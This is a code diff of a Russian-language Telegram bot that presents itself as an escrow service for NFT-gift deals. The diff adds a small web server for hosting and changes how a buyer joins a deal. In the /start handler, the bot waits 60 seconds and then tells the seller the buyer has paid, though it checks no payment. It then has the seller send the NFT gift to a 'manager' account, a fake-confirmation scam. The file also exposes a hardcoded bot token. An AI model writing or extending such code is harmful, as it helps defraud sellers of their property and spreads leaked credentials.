@@ -3,6 +3,7 @@ import random
 import string
 import sqlite3
 from datetime import datetime
+from aiohttp import web
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command, CommandObject
@@ -16,6 +17,7 @@ TOKEN = "8869240435:AAGySmGttt7CEOskqjX7ciBkKgxAR0UEESw"
 BOT_USERNAME = "protectionDeals_bot"
 MANAGER_USERNAME = "@ManagerProtection"
 SUPPORT_USERNAME = "@Protection_D_Support"
+PORT = 8080  # Порт для Render
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -96,6 +98,20 @@ def back_to_main_btn():
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
     ])
 
+# ---------- ЗАГЛУШКА ДЛЯ RENDER (открывает порт) ----------
+async def handle(request):
+    return web.Response(text="Bot is running!")
+
+app = web.Application()
+app.router.add_get("/", handle)
+
+async def run_web():
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    await site.start()
+    print(f"Web server started on port {PORT}")
+
 # ---------- ОБРАБОТЧИК /start ----------
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, command: CommandObject):
@@ -109,31 +125,51 @@ async def cmd_start(message: types.Message, command: CommandObject):
         deal_id = args.split("_")[1]
         if deal_id.isdigit():
             deal = cur.execute("SELECT * FROM deals WHERE id=?", (int(deal_id),)).fetchone()
-            if deal and deal[6] == 'waiting_buyer' and deal[1] != user_id:
+            if deal:
+                seller_id = deal[1]
+                current_buyer = deal[2]
+                deal_status = deal[6]
+                
+                if current_buyer and current_buyer != user_id and deal_status != 'waiting_buyer':
+                    await message.answer("❌ Сделка недоступна или уже занята.")
+                    return
+                
+                if seller_id == user_id:
+                    await message.answer("❌ Вы не можете присоединиться к собственной сделке.")
+                    return
+                
                 cur.execute("UPDATE deals SET buyer_id=?, status='buyer_joined' WHERE id=?",
                             (user_id, int(deal_id)))
                 conn.commit()
+                
                 code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
                 cur.execute("UPDATE deals SET deal_code=? WHERE id=?", (code, int(deal_id)))
                 conn.commit()
-                buyer_name = message.from_user.full_name
-                await bot.send_message(deal[1],
+                
+                buyer_username = f"@{username}" if username != "нет" else "без username"
+                
+                await bot.send_message(seller_id,
                     f"✅ Покупатель присоединился к сделке #{deal_id}\n"
-                    f"👤 {buyer_name} (@{username})\n"
+                    f"👤 {buyer_username}\n"
                     f"🔑 Код сделки: {code}")
-                await asyncio.sleep(30)
-                await bot.send_message(deal[1],
-                    f"💰 Покупатель оплатил!\n"
-                    f"📦 Переведите NFT-подарок менеджеру: {MANAGER_USERNAME}, "
-                    f"после проверки вам отправят деньги, а подарок будет отдан покупателю.",
-                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton(text="✅ Подтвердить отправку подарка",
-                                              callback_data=f"confirm_gift_{deal_id}")]
-                    ]))
+                
                 await message.answer("🔗 Вы успешно присоединились к сделке. Ожидайте подтверждения от продавца.")
+                
+                await asyncio.sleep(60)
+                
+                current_deal = cur.execute("SELECT status FROM deals WHERE id=?", (int(deal_id),)).fetchone()
+                if current_deal and current_deal[0] == 'buyer_joined':
+                    await bot.send_message(seller_id,
+                        f"💰 Покупатель успешно перевёл деньги!\n\n"
+                        f"📦 Переведите NFT-подарок менеджеру: {MANAGER_USERNAME}\n"
+                        f"После проверки вам отправят деньги, а подарок будет отдан покупателю.",
+                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                            [InlineKeyboardButton(text="✅ Подтвердить отправку подарка",
+                                                  callback_data=f"confirm_gift_{deal_id}")]
+                        ]))
                 return
             else:
-                await message.answer("❌ Сделка недоступна или уже занята.")
+                await message.answer("❌ Сделка не найдена.")
         else:
             await message.answer("❌ Неверная ссылка.")
     else:
@@ -155,7 +191,6 @@ async def cmd_start(message: types.Message, command: CommandObject):
 @dp.callback_query(F.data == "my_req")
 async def my_requisites(call: types.CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
-    # Проверяем, есть ли уже сохранённые реквизиты
     reqs = cur.execute("SELECT currency, card_number FROM requisites WHERE user_id=?", (user_id,)).fetchall()
     if reqs:
         text = "💳 Ваши сохранённые реквизиты:\n\n"
@@ -175,7 +210,6 @@ async def choose_req_currency(call: types.CallbackQuery, state: FSMContext):
     currency = call.data.split("_")[1]
     user_id = call.from_user.id
     
-    # Проверяем, есть ли уже реквизит для этой валюты
     existing = cur.execute("SELECT card_number FROM requisites WHERE user_id=? AND currency=?",
                           (user_id, currency)).fetchone()
     if existing:
@@ -215,7 +249,6 @@ async def save_card(message: types.Message, state: FSMContext):
                 (user_id, currency, card))
     conn.commit()
     
-    # Показываем все сохранённые реквизиты
     reqs = cur.execute("SELECT currency, card_number FROM requisites WHERE user_id=?", (user_id,)).fetchall()
     text = f"✅ Реквизит для {currency} сохранён!\n\n💳 Все ваши реквизиты:\n"
     for curr, c in reqs:
@@ -343,7 +376,11 @@ async def back_to_main(call: types.CallbackQuery, state: FSMContext):
 # ---------- ЗАПУСК ----------
 async def main():
     print("Бот запущен!")
-    await dp.start_polling(bot)
+    # Запускаем веб-сервер и бота параллельно
+    await asyncio.gather(
+        run_web(),
+        dp.start_polling(bot)
+    )
 
 if __name__ == "__main__":
     asyncio.run(main())
